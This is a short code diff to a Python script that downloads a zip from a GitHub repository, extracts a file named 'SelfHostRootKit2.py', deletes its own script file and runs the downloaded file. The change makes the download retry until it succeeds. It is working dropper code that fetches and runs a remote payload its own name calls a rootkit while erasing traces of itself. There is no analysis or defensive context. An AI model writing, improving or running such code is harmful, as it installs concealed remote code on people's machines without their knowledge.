@@ -96,8 +96,8 @@ for i in range(2):
             os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
             time.sleep(5)
 
-tryit = True
-while tryit == True:
+tryit = False
+while tryit == False:
     try:
         url, listfile = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip", "SelfHostRootKit2.py"
         dir = getNameDir(url)
@@ -105,9 +105,9 @@ while tryit == True:
         moveFileFromDir(dir, listfile)
         time.sleep(1)
         supDir(dir)
+        tryit = True
     except:
         print("download error")
         time.sleep(0.5)
-        pass
 os.remove(getFileName())
 os.system("SelfHostRootKit2.py")
